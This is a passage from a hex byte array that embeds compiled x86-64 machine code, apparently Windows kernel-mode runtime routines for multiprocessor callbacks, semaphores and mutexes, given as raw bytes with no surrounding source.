    0x24, 0x40, 0x33, 0xC0, 0x48, 0x8B, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x48,
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5E, 0x5D, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x4C, 0x24, 0x08, 0x53, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x48,
    0x4D, 0x8B, 0xF0, 0x4C, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0xC9, 0x30, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x2A, 0x32, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x4C, 0x8B, 0xE0, 0xFF, 0x15,
    0x3C, 0x30, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0x29, 0x30, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x75, 0x11, 0xB8, 0xDB, 0xFF, 0xFF,
    0xFF, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5B, 0xC3, 0xBA, 0x28, 0x10,
    0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x70, 0x4D, 0x54, 0x52, 0x48, 0x89, 0x7C, 0x24, 0x38, 0xFF,
    0x15, 0xCB, 0x30, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x75, 0x14, 0x8D, 0x47, 0xF8,
    0x48, 0x8B, 0x7C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5B,
    0xC3, 0x48, 0x89, 0x6C, 0x24, 0x78, 0x48, 0x89, 0x74, 0x24, 0x40, 0x48, 0x89, 0x18, 0x48, 0x8D,
    0x68, 0x28, 0x33, 0xF6, 0x4C, 0x89, 0x6C, 0x24, 0x30, 0x4C, 0x89, 0x78, 0x08, 0x4C, 0x89, 0x70,
    0x10, 0x48, 0xC7, 0x40, 0x18, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xDD, 0x44, 0x8D, 0x6E, 0x02,
    0xC7, 0x40, 0x20, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8D, 0x15, 0xF9, 0xFC, 0xFF, 0xFF, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xED,
    0x2F, 0x00, 0x00, 0x41, 0x8B, 0xD5, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xD9, 0x2F, 0x00, 0x00, 0x40,
    0x0F, 0xB6, 0xD6, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC4, 0x2F, 0x00, 0x00, 0x83, 0xC6, 0x01, 0x48,
    0x83, 0xC3, 0x40, 0x83, 0xFE, 0x40, 0x72, 0xC8, 0x45, 0x0F, 0x20, 0xC5, 0xB8, 0x02, 0x00, 0x00,
    0x00, 0x44, 0x0F, 0x22, 0xC0, 0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x33, 0xDB, 0x0F,
    0xB6, 0xF0, 0x3B, 0xDE, 0x74, 0x1A, 0x8B, 0xCB, 0x49, 0x0F, 0xA3, 0xCC, 0x73, 0x12, 0x48, 0xC1,
    0xE1, 0x06, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x03, 0xCD, 0xFF, 0x15, 0x40, 0x2F, 0x00, 0x00,
    0x83, 0xC3, 0x01, 0x83, 0xFB, 0x40, 0x72, 0xDA, 0x48, 0x8B, 0xCE, 0x4D, 0x8B, 0xC6, 0x49, 0x8B,
    0xD7, 0xFF, 0x54, 0x24, 0x70, 0x45, 0x0F, 0xB6, 0xDD, 0x45, 0x0F, 0x22, 0xC3, 0xFF, 0x94, 0x24,
    0x88, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xC9, 0x2F, 0x00, 0x00, 0x4C,
    0x8B, 0x6C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x78, 0x48, 0x8B,
    0x7C, 0x24, 0x38, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5B,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x55, 0x56, 0x41, 0x54, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B, 0xD8, 0x48,
    0x8B, 0xF2, 0x48, 0x8B, 0xE9, 0xFF, 0x15, 0x2D, 0x2F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x8E, 0x30,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x4C, 0x8B, 0xE0, 0xFF, 0x15, 0xA0, 0x2E, 0x00, 0x00,
    0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0x8D, 0x2E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x4C, 0x8B,
    0xF0, 0x75, 0x10, 0x41, 0x8D, 0x46, 0xDB, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5E, 0x41, 0x5C, 0x5E,
    0x5D, 0x5B, 0xC3, 0xBA, 0x28, 0x10, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x70, 0x4D, 0x54, 0x52,
    0x48, 0x89, 0x7C, 0x24, 0x60, 0xFF, 0x15, 0x35, 0x2F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B,
    0xF8, 0x75, 0x14, 0x8D, 0x47, 0xF8, 0x48, 0x8B, 0x7C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41,
    0x5E, 0x41, 0x5C, 0x5E, 0x5D, 0x5B, 0xC3, 0x48, 0x89, 0x28, 0x48, 0x89, 0x70, 0x08, 0x48, 0x89,
    0x58, 0x10, 0x48, 0x8D, 0x68, 0x28, 0x33, 0xF6, 0x4C, 0x89, 0x6C, 0x24, 0x68, 0x4C, 0x89, 0x7C,
    0x24, 0x70, 0x48, 0xC7, 0x40, 0x18, 0xFF, 0xFF, 0xFF, 0xFF, 0xC7, 0x40, 0x20, 0x00, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xDD, 0x44, 0x8D, 0x7E, 0x02, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8D, 0x15, 0x69, 0xFB, 0xFF, 0xFF, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x5D,
    0x2E, 0x00, 0x00, 0x41, 0x8B, 0xD7, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x49, 0x2E, 0x00, 0x00, 0x40,
    0x0F, 0xB6, 0xD6, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x34, 0x2E, 0x00, 0x00, 0x83, 0xC6, 0x01, 0x48,
    0x83, 0xC3, 0x40, 0x83, 0xFE, 0x40, 0x72, 0xC8, 0x45, 0x0F, 0x20, 0xC5, 0x45, 0x0F, 0x22, 0xC7,
    0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x7C, 0x24, 0x70, 0x33, 0xDB, 0x0F,
    0xB6, 0xF0, 0x3B, 0xDE, 0x74, 0x1A, 0x8B, 0xCB, 0x49, 0x0F, 0xA3, 0xCC, 0x73, 0x12, 0x48, 0xC1,
    0xE1, 0x06, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x03, 0xCD, 0xFF, 0x15, 0xB0, 0x2D, 0x00, 0x00,
    0x83, 0xC3, 0x01, 0x83, 0xFB, 0x40, 0x72, 0xDA, 0x41, 0x0F, 0xB6, 0xCD, 0x44, 0x0F, 0x22, 0xC1,
    0x41, 0xFF, 0xD6, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x4A, 0x2E, 0x00, 0x00, 0x4C, 0x8B,
    0x6C, 0x24, 0x68, 0x48, 0x8B, 0x7C, 0x24, 0x60, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5E,
    0x41, 0x5C, 0x5E, 0x5D, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B,
    0xF9, 0x4D, 0x8B, 0xE0, 0x4C, 0x8B, 0xEA, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0xB8, 0x2D, 0x00, 0x00,
    0x48, 0x83, 0xFB, 0x40, 0x0F, 0x83, 0xF6, 0x00, 0x00, 0x00, 0x48, 0x0F, 0xA3, 0xD8, 0x0F, 0x83,
    0xEC, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x05, 0x2F, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20,
    0x48, 0x89, 0x6C, 0x24, 0x50, 0xFF, 0x15, 0x15, 0x2D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20,
    0xFF, 0x15, 0x02, 0x2D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xE8, 0x75, 0x05, 0x8D, 0x45,
    0xDB, 0xEB, 0x28, 0xBA, 0x28, 0x10, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x70, 0x4D, 0x54, 0x52,
    0x48, 0x89, 0x74, 0x24, 0x58, 0xFF, 0x15, 0xB5, 0x2D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B,
    0xF0, 0x75, 0x1C, 0x8D, 0x46, 0xF8, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B, 0x6C, 0x24, 0x50,
    0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0x4C,
    0x89, 0x28, 0x4C, 0x89, 0x60, 0x08, 0x48, 0x89, 0x78, 0x10, 0x48, 0xC7, 0x40, 0x18, 0xFF, 0xFF,
    0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x07, 0xFA, 0xFF, 0xFF, 0x48, 0x8D, 0x48, 0x28, 0x4C, 0x8B, 0xC0,
    0xC7, 0x40, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF3, 0x2C, 0x00, 0x00, 0x41, 0xBC, 0x02,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x4E, 0x28, 0x41, 0x8B, 0xD4, 0xFF, 0x15, 0xD8, 0x2C, 0x00, 0x00,
    0x48, 0x8D, 0x4E, 0x28, 0x0F, 0xB6, 0xD3, 0xFF, 0x15, 0xC3, 0x2C, 0x00, 0x00, 0x44, 0x0F, 0x20,
    0xC3, 0x45, 0x0F, 0x22, 0xC4, 0x48, 0x8D, 0x4E, 0x28, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0xFF, 0x15,
    0x6C, 0x2C, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0xDB, 0x45, 0x0F, 0x22, 0xC3, 0xFF, 0xD5, 0x33, 0xD2,
    0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x0F, 0x2D, 0x00, 0x00, 0x33, 0xC0, 0xE9, 0x66, 0xFF, 0xFF, 0xFF,
    0xB8, 0xDF, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D,
    0x41, 0x5C, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0x89, 0x2C, 0x00, 0x00, 0x48,
    0x89, 0x03, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xFF, 0x15, 0x6E, 0x2C, 0x00, 0x00, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x4C,
    0x8B, 0xD8, 0x33, 0xC0, 0x48, 0x83, 0xE9, 0x01, 0x49, 0x0F, 0xA3, 0xCB, 0x73, 0x04, 0x48, 0x83,
    0xC0, 0x01, 0x48, 0x85, 0xC9, 0x75, 0xED, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x8B, 0xC1, 0x4C, 0x8D, 0x44, 0x24, 0x38, 0xB2, 0x01, 0x33, 0xC9, 0x48,
    0x69, 0xC0, 0xF0, 0xD8, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0xFF, 0x15, 0x67, 0x2C, 0x00,
    0x00, 0x85, 0xC0, 0x8B, 0xD0, 0x74, 0x23, 0x81, 0xEA, 0xC0, 0x00, 0x00, 0x00, 0x74, 0x11, 0x83,
    0xFA, 0x41, 0x74, 0x0C, 0x8B, 0xC8, 0xE8, 0xB5, 0x19, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3,
    0xB8, 0xD9, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xE8, 0x99, 0x2A, 0x00, 0x00, 0x3D, 0x24, 0x00, 0x00, 0x40, 0x0F, 0x95,
    0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x66, 0x90, 0xFA, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xE8, 0x0D,
    0x17, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x0B, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4,
    0x20, 0x5B, 0xC3, 0xC7, 0x00, 0x28, 0x04, 0x48, 0x19, 0x48, 0xC7, 0x40, 0x08, 0x00, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x03, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x75, 0x0A, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83,
    0xC4, 0x28, 0xC3, 0x8B, 0x01, 0x3D, 0x28, 0x04, 0x48, 0x19, 0x75, 0xED, 0xF0, 0x83, 0x01, 0x01,
    0xE8, 0x1B, 0x17, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xC1, 0x08, 0x48, 0x8B, 0xDA, 0xFF, 0x15, 0x75,
    0x2B, 0x00, 0x00, 0x88, 0x43, 0x08, 0xE8, 0xE5, 0x18, 0x00, 0x00, 0x48, 0x89, 0x03, 0xFA, 0x48,
    0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0x0A,
    0x48, 0x8B, 0xFA, 0xE8, 0xC8, 0x18, 0x00, 0x00, 0x0F, 0xB6, 0x57, 0x08, 0x48, 0x8D, 0x4B, 0x08,
    0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0x48, 0xFF, 0x25, 0x2F, 0x2B, 0x00,
    0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xC1, 0x08, 0x48, 0x8B, 0xDA, 0xFF, 0x15, 0x05,
    0x2B, 0x00, 0x00, 0x88, 0x43, 0x08, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB6, 0x52, 0x08, 0x48, 0x83, 0xC1, 0x08, 0x48, 0xFF, 0x25, 0xF1, 0x2A, 0x00, 0x00, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0xB9, 0x20, 0x00,
    0x00, 0x00, 0xE8, 0xF9, 0x15, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x25, 0x48,
    0x8D, 0x48, 0x08, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0xC7, 0x00, 0x02, 0x01, 0x20, 0x19, 0xFF, 0x15,
    0xC4, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x1F, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83,
    0xC4, 0x20, 0x5F, 0xC3, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83,
    0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x74, 0x58, 0x48, 0x8D,
    0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x49, 0x48, 0xB9, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x2F, 0x8B, 0x03, 0x3D, 0x02, 0x01, 0x20, 0x19, 0x75, 0x26,
    0xF0, 0x83, 0x03, 0x01, 0x48, 0x8D, 0x4B, 0x08, 0x45, 0x33, 0xC0, 0xBA, 0xFF, 0x0F, 0x00, 0x00,
    0xFF, 0x15, 0x4A, 0x2A, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0xB2, 0x15, 0x00, 0x00, 0x33, 0xC0,
    0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x4A, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x3B, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
    0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x48, 0x23, 0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0,
    0x75, 0x21, 0x8B, 0x01, 0x3D, 0x02, 0x01, 0x20, 0x19, 0x75, 0x18, 0x45, 0x33, 0xC0, 0x48, 0x83,
    0xC1, 0x08, 0x41, 0x8D, 0x50, 0x01, 0xFF, 0x15, 0xD4, 0x29, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83,
    0xC4, 0x28, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x43, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x34, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
    0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x48, 0x23, 0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0,
    0x75, 0x1A, 0x8B, 0x01, 0x3D, 0x02, 0x01, 0x20, 0x19, 0x75, 0x11, 0x48, 0x83, 0xC1, 0x08, 0xFF,
    0x15, 0x83, 0x29, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF,
    0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x0B, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0xE6, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
    0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0,
    0x75, 0xCC, 0x8B, 0x03, 0x3D, 0x02, 0x01, 0x20, 0x19, 0x75, 0xC3, 0x48, 0x89, 0x7C, 0x24, 0x48,
    0x33, 0xFF, 0x83, 0xFA, 0xFF, 0x75, 0x1D, 0x45, 0x0F, 0xB6, 0xC8, 0x48, 0x8D, 0x4B, 0x08, 0x33,
    0xD2, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x7C, 0x24, 0x20, 0xFF, 0x15, 0x01, 0x29, 0x00, 0x00, 0x44,
    0x8B, 0xD8, 0xEB, 0x2E, 0x8B, 0xC2, 0x45, 0x0F, 0xB6, 0xC8, 0x48, 0x8D, 0x4B, 0x08, 0x45, 0x33,
    0xC0, 0x33, 0xD2, 0x48, 0x69, 0xC0, 0xF0, 0xD8, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48,
    0x8D, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x15, 0xD1, 0x28, 0x00, 0x00, 0x44,
    0x8B, 0xD8, 0x45, 0x85, 0xDB, 0x74, 0x45, 0x41, 0x81, 0xEB, 0xC0, 0x00, 0x00, 0x00, 0x74, 0x2C,
    0x41, 0x83, 0xEB, 0x41, 0x74, 0x26, 0x41, 0x83, 0xFB, 0x01, 0x74, 0x10, 0xB8, 0xE0, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xB8, 0xD8, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xB8, 0xD9, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x8B, 0x0B, 0xB8, 0x95,
    0xFE, 0xFF, 0xFF, 0x81, 0xF9, 0x02, 0x01, 0x20, 0x19, 0x0F, 0x44, 0xC7, 0x48, 0x8B, 0x7C, 0x24,
    0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x45, 0x33, 0xC0, 0xE9, 0xE8, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0xB0, 0x01, 0xE9, 0xD8, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0xB9, 0x20, 0x00,
    0x00, 0x00, 0xE8, 0x29, 0x13, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x27, 0x45,
    0x33, 0xC0, 0x48, 0x8D, 0x48, 0x08, 0xC7, 0x00, 0x10, 0x11, 0x60, 0x19, 0x41, 0x8D, 0x50, 0x01,
    0xFF, 0x15, 0xF2, 0x27, 0x00, 0x00, 0x48, 0x89, 0x1F, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30,
    0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30,
    0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x0B, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x8B, 0x01, 0x3D, 0x10, 0x11, 0x60, 0x19,
    0x75, 0xEC, 0xF0, 0x83, 0x01, 0x01, 0x48, 0x83, 0xC1, 0x08, 0x45, 0x33, 0xC0, 0xBA, 0xFF, 0x0F,
    0x00, 0x00, 0xFF, 0x15, 0x98, 0x27, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x00, 0x13, 0x00, 0x00,
    0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x21, 0x8B, 0x01, 0x3D, 0x10, 0x11, 0x60, 0x19,
    0x75, 0x18, 0x45, 0x33, 0xC0, 0x48, 0x83, 0xC1, 0x08, 0x41, 0x8D, 0x50, 0x01, 0xFF, 0x15, 0x5D,
    0x27, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48,
    0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x0B, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x8B, 0x01, 0x3D, 0x10, 0x11, 0x60, 0x19,
    0x75, 0xEC, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x33, 0xFF, 0x83, 0xFA, 0xFF, 0x75, 0x1D, 0x45, 0x0F,
    0xB6, 0xC8, 0x48, 0x83, 0xC1, 0x08, 0x33, 0xD2, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x7C, 0x24, 0x20,
